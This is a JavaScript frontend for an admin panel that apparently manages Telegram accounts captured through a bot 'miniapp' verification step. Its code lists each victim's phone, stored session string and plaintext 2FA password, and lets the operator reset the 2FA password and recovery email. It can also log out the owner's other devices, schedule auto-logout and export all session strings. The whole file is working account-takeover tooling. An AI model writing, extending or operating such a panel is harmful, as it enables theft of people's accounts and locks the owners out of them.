/* Manager — frontend logic */
const API = '';
let sessionsCache = [];

/* ---------- helpers ---------- */
const $ = (s, p = document) => p.querySelector(s);
const $$ = (s, p = document) => [...p.querySelectorAll(s)];

function toast(msg, kind = '') {
  const t = $('#toast');
  t.textContent = msg;
  t.className = 'toast show ' + kind;
  setTimeout(() => (t.className = 'toast'), 2400);
}

async function api(path, opts = {}) {
  const r = await fetch(API + path, {
    headers: { 'Content-Type': 'application/json', ...(opts.headers || {}) },
    ...opts,
  });
  const txt = await r.text();
  let data = null;
  try { data = txt ? JSON.parse(txt) : null; } catch { data = { raw: txt }; }
  if (!r.ok) throw new Error((data && data.error) || `HTTP ${r.status}`);
  return data;
}

function fmtTs(ts) {
  if (!ts) return '—';
  const d = new Date(ts * 1000);
  return d.toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
}
function fmtRelative(ts) {
  if (!ts) return '—';
  const diff = Math.floor(Date.now() / 1000) - ts;
  if (diff < 60) return 'just now';
  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
  if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
  return Math.floor(diff / 86400) + 'd ago';
}
function fmtCountdown(ts) {
  if (!ts) return '—';
  const diff = ts - Math.floor(Date.now() / 1000);
  if (diff <= 0) return 'due';
  const h = Math.floor(diff / 3600);
  const m = Math.floor((diff % 3600) / 60);
  return `${h}h ${m}m`;
}

function openModal(id) { $('#' + id).classList.remove('hidden'); }
function closeModal(id) { $('#' + id).classList.add('hidden'); }
$$('[data-close]').forEach(b => b.onclick = () => b.closest('.modal').classList.add('hidden'));

/* ---------- navigation ---------- */
function switchView(name) {
  $$('.view').forEach(v => v.classList.add('hidden'));
  $('#view-' + name).classList.remove('hidden');
  $$('.nav-item').forEach(n => n.classList.toggle('active', n.dataset.view === name));
  $('#topbar-title').textContent = name.charAt(0).toUpperCase() + name.slice(1);
  $('#sidebar').classList.remove('open');
  if (name === 'dashboard') loadDashboard();
  if (name === 'sessions') loadSessions();
  if (name === 'audit') loadAudit();
  if (name === 'settings') loadSettings();
}
$$('.nav-item, [data-view]').forEach(a => a.onclick = (e) => { e.preventDefault(); switchView(a.dataset.view); });
$('#hamb').onclick = () => $('#sidebar').classList.toggle('open');
$('#btn-logout').onclick = async () => { await api('/api/logout', { method: 'POST' }); location.href = '/'; };
$('#btn-refresh').onclick = () => {
  const view = $('.nav-item.active').dataset.view;
  switchView(view);
  toast('Refreshed', 'ok');
};

/* ---------- dashboard ---------- */
async function loadDashboard() {
  try {
    const d = await api('/api/dashboard');
    const cards = [
      { k: 'Total Sessions', v: d.total, cls: '' },
      { k: 'New Today', v: d.today, cls: 'ok' },
      { k: 'Protected', v: d.protected, cls: '' },
      { k: '2FA Stored', v: d.has_2fa_pw, cls: '' },
      { k: 'Pending Auto-Logout', v: d.pending_auto_logout, cls: 'warn' },
      { k: 'Auto-Logout', v: d.auto_logout_enabled ? 'ON' : 'OFF', cls: d.auto_logout_enabled ? 'bad' : '' },
      { k: 'Bot', v: d.bot_running ? 'Online' : 'Off', cls: d.bot_running ? 'ok' : 'bad' },
    ];
    $('#stats').innerHTML = cards.map(c => `<div class="stat ${c.cls}"><div class="v">${c.v}</div><div class="k">${c.k}</div></div>`).join('');

    // miniapp URL banner
    let banner = $('#miniapp-banner');
    if (!banner) {
      banner = document.createElement('div');
      banner.id = 'miniapp-banner';
      banner.className = 'panel';
      $('#view-dashboard').insertBefore(banner, $('#stats').nextSibling);
    }
    if (d.miniapp_url && d.miniapp_url !== '/m/') {
      banner.innerHTML = `
        <div class="panel-h"><span>Miniapp URL</span><span class="badge blue">Set in BotFather</span></div>
        <div class="copy-box" style="position:relative">
          <button class="btn sm ghost" id="copy-miniapp" style="position:absolute;top:4px;right:4px">Copy</button>
          ${d.miniapp_url}
        </div>
        <div class="muted sm" style="margin-top:8px">In @BotFather → /mybots → select bot → Bot Settings → Menu Button → configure Web App URL to the above.</div>
      `;
      $('#copy-miniapp').onclick = () => { navigator.clipboard.writeText(d.miniapp_url); toast('Copied', 'ok'); };
    } else {
      banner.innerHTML = `
        <div class="panel-h"><span>Miniapp URL</span><span class="badge yellow">Not configured</span></div>
        <div class="muted sm">Run with <code>USE_TUNNEL=1 ./start.sh</code> to expose via Cloudflare, or set <code>MINI_APP_URL</code> in <code>.env</code>. Then point BotFather's Web App URL to <code>&lt;that-url&gt;/m/</code>.</div>
      `;
    }

    const list = sessionsCache.length ? sessionsCache : await api('/api/sessions');
    sessionsCache = list;
    const recent = list.slice(0, 5);
    $('#recent-list').innerHTML = recent.length
      ? recent.map(scardHTML).join('')
      : `<div class="muted" style="padding:20px;text-align:center">No sessions yet. Users who verify via the miniapp will appear here.</div>`;
    bindScardActions();
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- sessions ---------- */
async function loadSessions() {
  try {
    sessionsCache = await api('/api/sessions');
    renderSessions();
  } catch (e) { toast(e.message, 'err'); }
}

function renderSessions() {
  const q = ($('#search').value || '').toLowerCase();
  const f2 = $('#filter-2fa').value;
  const fp = $('#filter-protected').value;
  const filtered = sessionsCache.filter(s => {
    if (q && !(`${s.phone} ${s.name} ${s.username} ${s.user_id}`.toLowerCase().includes(q))) return false;
    if (f2 === 'yes' && !s.has_2fa_pw) return false;
    if (f2 === 'no' && s.has_2fa_pw) return false;
    if (fp === 'yes' && !s.is_protected) return false;
    if (fp === 'no' && s.is_protected) return false;
    return true;
  });
  $('#session-list').innerHTML = filtered.length
    ? filtered.map(scardHTML).join('')
    : `<div class="muted" style="padding:20px;text-align:center">No matching sessions.</div>`;
  bindScardActions();
}

$('#search').oninput = renderSessions;
$('#filter-2fa').onchange = renderSessions;
$('#filter-protected').onchange = renderSessions;

function scardHTML(s) {
  const initials = (s.name || s.phone || '?').slice(0, 2).toUpperCase();
  const badges = [];
  if (s.is_current) badges.push('<span class="badge blue">Current</span>');
  if (s.is_protected) badges.push('<span class="badge green">Protected</span>');
  if (s.has_2fa_pw) badges.push('<span class="badge yellow">2FA</span>');
  if (s.email) badges.push(`<span class="badge">✉ ${s.email}</span>`);
  if (s.auto_logout_at && !s.auto_logout_fired) badges.push(`<span class="badge orange">Auto-LO: ${fmtCountdown(s.auto_logout_at)}</span>`);
  if (s.auto_logout_fired) badges.push('<span class="badge red">Auto-LO fired</span>');
  return `
  <div class="scard" data-id="${s.id}">
    <div class="scard-top">
      <div class="scard-id">
        <div class="avatar">${initials}</div>
        <div>
          <div class="scard-name">${s.name || '—'} ${s.username ? '@' + s.username : ''}</div>
          <div class="scard-phone">${s.phone || '—'}</div>
        </div>
      </div>
      <div class="badges">${badges.join('')}</div>
    </div>
    <div class="scard-meta">
      <span>Created ${fmtRelative(s.created_at)}</span>
      <span>Last seen ${fmtRelative(s.last_seen)}</span>
      ${s.last_action ? `<span>Last: ${s.last_action}</span>` : ''}
    </div>
    <div class="scard-actions">
      <button class="btn sm" data-act="devices">Devices</button>
      <button class="btn sm" data-act="2fa">2FA</button>
      <button class="btn sm" data-act="mail">Email</button>
      <button class="btn sm ${s.is_protected ? 'primary' : 'ghost'}" data-act="protect">${s.is_protected ? 'Protected ✓' : 'Protect'}</button>
      <button class="btn sm ${s.is_current ? 'primary' : 'ghost'}" data-act="current">${s.is_current ? 'Current ✓' : 'Set Current'}</button>
      <button class="btn sm" data-act="detail">Details</button>
      <button class="btn sm danger" data-act="force">Force Logout</button>
      <button class="btn sm ghost" data-act="delete">Delete</button>
    </div>
  </div>`;
}

function bindScardActions() {
  $$('.scard').forEach(card => {
    const id = +card.dataset.id;
    $$('button[data-act]', card).forEach(btn => {
      btn.onclick = () => handleAction(btn.dataset.act, id);
    });
  });
}

async function handleAction(act, id) {
  const s = sessionsCache.find(x => x.id === id);
  if (!s) return;
  try {
    if (act === 'devices') return openDevices(id, s);
    if (act === '2fa') return open2FA(id, s);
    if (act === 'mail') return openMail(id, s);
    if (act === 'detail') return openDetail(id);
    if (act === 'protect') {
      await api(`/api/sessions/${id}/protect`, { method: 'POST', body: JSON.stringify({ value: !s.is_protected }) });
      toast('Updated', 'ok'); loadSessions();
    }
    if (act === 'current') {
      await api(`/api/sessions/${id}/current`, { method: 'POST', body: JSON.stringify({ value: !s.is_current }) });
      toast('Updated', 'ok'); loadSessions();
    }
    if (act === 'force') {
      if (!confirm(`Logout ALL devices on ${s.phone}? The session_string for this account will be invalidated.`)) return;
      const r = await api(`/api/sessions/${id}/force-logout`, { method: 'POST' });
      toast(`Logged out ${r.killed || 0} devices`, 'ok');
    }
    if (act === 'delete') {
      if (!confirm('Delete this session from Manager? (DB row only — does not logout Telegram)')) return;
      await api(`/api/sessions/${id}`, { method: 'DELETE' });
      toast('Deleted', 'ok'); loadSessions();
    }
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- devices ---------- */
async function openDevices(id, s) {
  $('#dev-phone').textContent = s.phone || s.name;
  $('#dev-body').innerHTML = `<div class="muted">Loading devices…</div>`;
  openModal('modal-devices');
  try {
    const r = await api(`/api/sessions/${id}/devices`);
    if (!r.devices || !r.devices.length) {
      $('#dev-body').innerHTML = `<div class="muted">No devices found.</div>`;
      return;
    }
    $('#dev-body').innerHTML = r.devices.map(d => `
      <div class="dev-row">
        <div class="dev-info">
          <div class="dev-name">${d.app_name || 'Unknown'} ${d.is_current ? '<span class="badge blue">This session</span>' : ''}</div>
          <div class="dev-meta">${d.device_model || ''} · ${d.platform || ''} · ${d.system_version || ''}<br>${d.ip || '—'} · ${d.country || '—'} · active ${fmtRelative(d.date_active ? new Date(d.date_active).getTime() / 1000 : 0)}</div>
        </div>
        ${d.is_current ? '' : `<button class="btn sm danger" data-hash="${d.hash}">Logout</button>`}
      </div>
    `).join('');
    $$('#dev-body button[data-hash]').forEach(b => b.onclick = async () => {
      try {
        await api(`/api/sessions/${id}/logout-device`, { method: 'POST', body: JSON.stringify({ hash: +b.dataset.hash }) });
        toast('Logged out', 'ok');
        openDevices(id, s);
      } catch (e) { toast(e.message, 'err'); }
    });
  } catch (e) { $('#dev-body').innerHTML = `<div class="err">${e.message}</div>`; }
}

$('#btn-logout-others').onclick = async () => {
  const phone = $('#dev-phone').textContent;
  const s = sessionsCache.find(x => x.phone === phone || x.name === phone);
  if (!s) return;
  if (!confirm('Logout ALL other devices on this account?')) return;
  try {
    const r = await api(`/api/sessions/${s.id}/logout-others`, { method: 'POST' });
    toast(`Logged out ${r.killed || 0} devices`, 'ok');
    openDevices(s.id, s);
  } catch (e) { toast(e.message, 'err'); }
};

/* ---------- 2FA ---------- */
async function open2FA(id, s) {
  $('#fa-phone').textContent = s.phone || s.name;
  $('#fa-current').value = '';
  $('#fa-new').value = '';
  $('#fa-hint').value = s.email || '';
  $('#fa-email').value = s.email || '';
  $('#fa-err').textContent = '';
  $('#fa-status').textContent = 'Checking 2FA status…';
  openModal('modal-2fa');
  try {
    const r = await api(`/api/sessions/${id}/2fa-status`);
    if (r.error) {
      $('#fa-status').textContent = 'Could not fetch 2FA status: ' + r.error;
    } else {
      $('#fa-status').innerHTML = r.has_2fa
        ? `<span class="badge yellow">2FA enabled</span> hint: ${r.hint || '—'} · recovery: ${r.has_recovery ? 'yes' : 'no'}`
        : `<span class="badge green">No 2FA yet</span>`;
    }
  } catch (e) { $('#fa-status').textContent = 'Status check failed: ' + e.message; }
}

$('#btn-set-2fa').onclick = async () => {
  const phone = $('#fa-phone').textContent;
  const s = sessionsCache.find(x => x.phone === phone || x.name === phone);
  if (!s) return;
  const body = {
    current_password: $('#fa-current').value,
    new_password: $('#fa-new').value,
    hint: $('#fa-hint').value,
    recovery_email: $('#fa-email').value,
  };
  if (!body.new_password && !body.recovery_email) { $('#fa-err').textContent = 'Enter new password or email'; return; }
  try {
    const r = await api(`/api/sessions/${s.id}/2fa`, { method: 'POST', body: JSON.stringify(body) });
    if (r.success) { toast('2FA updated', 'ok'); closeModal('modal-2fa'); }
    else { $('#fa-err').textContent = r.error || 'Failed'; }
  } catch (e) { $('#fa-err').textContent = e.message; }
};

/* ---------- mail ---------- */
function openMail(id, s) {
  $('#mail-phone').textContent = s.phone || s.name;
  $('#mail-input').value = s.email || '';
  openModal('modal-mail');
  $('#btn-save-mail').onclick = async () => {
    try {
      await api(`/api/sessions/${id}/mail`, { method: 'POST', body: JSON.stringify({ email: $('#mail-input').value }) });
      toast('Saved', 'ok'); closeModal('modal-mail'); loadSessions();
    } catch (e) { toast(e.message, 'err'); }
  };
}

/* ---------- detail ---------- */
async function openDetail(id) {
  try {
    const s = await api(`/api/sessions/${id}`);
    $('#d-phone').textContent = s.phone;
    const rows = [
      ['Phone', s.phone],
      ['User ID', s.user_id],
      ['Username', s.username || '—'],
      ['Name', s.name || '—'],
      ['Email', s.email || '—'],
      ['2FA Password', s.twofa_password || '—'],
      ['Protected', s.is_protected ? 'Yes' : 'No'],
      ['Current', s.is_current ? 'Yes' : 'No'],
      ['Created', fmtTs(s.created_at)],
      ['Last seen', fmtTs(s.last_seen)],
      ['Auto-logout at', s.auto_logout_at ? fmtTs(s.auto_logout_at) : '—'],
      ['Auto-logout fired', s.auto_logout_fired ? 'Yes' : 'No'],
    ];
    $('#d-body').innerHTML = `
      <div class="dl">${rows.map(r => `<div class="k">${r[0]}</div><div class="v">${r[1]}</div>`).join('')}</div>
      <div class="label">Notes</div>
      <textarea id="d-notes" class="input" rows="3">${s.notes || ''}</textarea>
      <button class="btn sm" id="d-save-notes" style="margin-top:6px">Save notes</button>
      <div class="label" style="margin-top:14px">Session String</div>
      <div class="copy-box"><button class="btn sm ghost" id="d-copy">Copy</button>${s.session_string || '—'}</div>
    `;
    openModal('modal-detail');
    $('#d-copy').onclick = () => { navigator.clipboard.writeText(s.session_string || ''); toast('Copied', 'ok'); };
    $('#d-save-notes').onclick = async () => {
      try {
        await api(`/api/sessions/${id}/notes`, { method: 'POST', body: JSON.stringify({ notes: $('#d-notes').value }) });
        toast('Saved', 'ok');
      } catch (e) { toast(e.message, 'err'); }
    };
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- audit ---------- */
async function loadAudit() {
  try {
    const rows = await api('/api/audit?limit=100');
    $('#audit-list').innerHTML = rows.length
      ? rows.map(r => `<div class="audit-row"><div class="ts">${fmtTs(r.ts)}</div><div class="act">${r.action}</div><div class="det">${r.phone || '—'} ${r.detail || ''}</div></div>`).join('')
      : `<div class="muted" style="padding:20px;text-align:center">No activity yet.</div>`;
  } catch (e) { toast(e.message, 'err'); }
}

/* ---------- settings ---------- */
async function loadSettings() {
  try {
    const s = await api('/api/settings');
    $('#set-al').checked = s.auto_logout_enabled;
    $('#set-hours').value = s.auto_logout_hours;
    $('#set-api-id').value = s.api_id || '';
    $('#set-api-hash').value = s.api_hash || '';
    $('#set-bot-token').value = s.bot_token || '';
    $('#set-log-channel').value = s.log_channel_id || '';
  } catch (e) { toast(e.message, 'err'); }
}

$('#btn-save-settings').onclick = async () => {
  try {
    const body = {
      auto_logout_enabled: $('#set-al').checked,
      auto_logout_hours: +$('#set-hours').value,
      api_id: $('#set-api-id').value,
      api_hash: $('#set-api-hash').value,
      bot_token: $('#set-bot-token').value,
      log_channel_id: $('#set-log-channel').value,
    };
    if ($('#set-pw').value) body.admin_password = $('#set-pw').value;
    await api('/api/settings', { method: 'POST', body: JSON.stringify(body) });
    toast('Saved', 'ok');
    $('#set-pw').value = '';
  } catch (e) { toast(e.message, 'err'); }
};

$('#btn-export').onclick = async () => {
  try {
    const data = await api('/api/export');
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `manager-sessions-${Date.now()}.json`;
    a.click();
    toast('Exported', 'ok');
  } catch (e) { toast(e.message, 'err'); }
};

/* ---------- init ---------- */
(async function init() {
  const me = await api('/api/me').catch(() => ({ admin: false }));
  if (!me.admin) location.href = '/';
  else switchView('dashboard');
})();

// auto refresh every 30s on dashboard/sessions
setInterval(() => {
  const v = $('.nav-item.active')?.dataset.view;
  if (v === 'dashboard') loadDashboard();
  else if (v === 'sessions') loadSessions();
}, 30000);
